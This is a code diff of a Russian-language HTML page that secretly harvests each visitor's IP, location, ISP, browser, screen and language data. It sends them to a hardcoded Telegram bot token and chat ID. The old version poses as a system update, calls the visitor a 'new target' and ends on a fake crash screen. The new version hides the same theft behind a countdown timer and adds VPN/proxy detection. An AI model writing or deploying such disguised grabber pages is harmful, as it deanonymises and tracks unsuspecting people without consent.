@@ -1,62 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Обновление системы</title>
-  <style>
-    body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .loader { text-align: center; border: 2px solid #00ff41; padding: 40px; border-radius: 15px; background: #111; }
-    .spinner { display: inline-block; width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <title>...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #888;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .timer {
+            font-size: 120px;
+            font-weight: bold;
+            color: #222;
+            background: #aaa;
+            padding: 40px 80px;
+            border-radius: 30px;
+            box-shadow: inset 0 -4px 0 #666;
+            user-select: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="loader">
-    <div class="spinner"></div>
-    <h2>Установка обновлений...</h2>
-    <p>Пожалуйста, не выключайте устройство</p>
-  </div>
+    <div class="timer" id="timer">10</div>
 
-  <script>
-    async function collectAndSend() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+    <script>
+        (function() {
+            const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
+            const chatId = '8098905046';
+            const timerEl = document.getElementById('timer');
+            let counter = 10;
 
-        let battery = 'недоступно';
-        try {
-          if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            battery = Math.round(b.level * 100) + '% | ' + (b.charging ? 'заряжается' : 'не заряжается');
-          }
-        } catch(e) {}
+            // Функция отправки в Telegram
+            function sendTelegram(text) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text })
+                }).catch(() => {});
+            }
 
-        const message = 'НОВЫЙ ЦЕЛЬ!\n' +
-          'IP: ' + (data.ip || '—') + '\n' +
-          'Город: ' + (data.city || '—') + '\n' +
-          'Регион: ' + (data.region || '—') + '\n' +
-          'Страна: ' + (data.country_name || '—') + '\n' +
-          'Провайдер: ' + (data.org || '—') + '\n' +
-          'Часовой пояс: ' + (data.timezone || '—') + '\n' +
-          'Браузер: ' + navigator.userAgent + '\n' +
-          'Экран: ' + screen.width + 'x' + screen.height + '\n' +
-          'Батарея: ' + battery + '\n' +
-          'Язык: ' + navigator.language;
+            // Асинхронный сбор данных
+            async function collectAndSend() {
+                try {
+                    // 1. IP и гео
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
 
-        const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
-        const chatId = '8098905046';
-        await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        });
+                    // 2. Определяем возможный VPN/прокси по признакам
+                    let vpnSigns = [];
+                    if (data.proxy === true) vpnSigns.push('прокси');
+                    if (data.hosting === true) vpnSigns.push('хостинг/датацентр');
+                    if (data.org && data.org.toLowerCase().includes('vpn')) vpnSigns.push('VPN в названии провайдера');
+                    if (data.country_code && data.country_code !== 'RU' && data.country_code !== 'UA' && data.country_code !== 'BY' && data.country_code !== 'KZ') vpnSigns.push('не СНГ');
+                    const vpnStatus = vpnSigns.length > 0 ? '⚠️ Есть признаки VPN/прокси: ' + vpnSigns.join(', ') : '✅ VPN/прокси не обнаружено';
 
-        document.body.innerHTML = '<div style="background:#0000aa;color:white;display:flex;height:100vh;justify-content:center;align-items:center;flex-direction:column;font-family:monospace;padding:20px;text-align:center;"><h1 style="font-size:50px;">:(</h1><p style="font-size:24px;">Ваш компьютер столкнулся с проблемой</p><p style="font-size:14px;margin-top:40px;">Код ошибки: CRITICAL_PROCESS_DIED</p></div>';
-      } catch(e) {
-        document.body.innerHTML = '<h1 style="color:red;">Ошибка</h1>';
-      }
-    }
-    collectAndSend();
-  </script>
+                    // 3. Формируем отчёт
+                    const message =
+                        'IP: ' + (data.ip || '—') + '\n' +
+                        'Город: ' + (data.city || '—') + '\n' +
+                        'Регион: ' + (data.region || '—') + '\n' +
+                        'Страна: ' + (data.country_name || '—') + ' (' + (data.country_code || '—') + ')\n' +
+                        'Провайдер: ' + (data.org || '—') + '\n' +
+                        'Часовой пояс: ' + (data.timezone || '—') + '\n' +
+                        'Браузер: ' + navigator.userAgent + '\n' +
+                        'Экран: ' + screen.width + 'x' + screen.height + '\n' +
+                        'Язык: ' + navigator.language + '\n' +
+                        vpnStatus;
+
+                    sendTelegram(message);
+                } catch(e) {
+                    sendTelegram('Ошибка сбора данных: ' + e.message);
+                }
+            }
+
+            // Счётчик
+            const interval = setInterval(() => {
+                counter--;
+                timerEl.textContent = counter;
+
+                if (counter <= 0) {
+                    clearInterval(interval);
+                    timerEl.textContent = '0';
+                    collectAndSend(); // отправляем данные
+                }
+            }, 1000);
+
+            // Если клик — просто сброс таймера (можно убрать)
+            document.addEventListener('click', () => {
+                counter = 10;
+                timerEl.textContent = counter;
+            });
+        })();
+    </script>
 </body>
 </html>
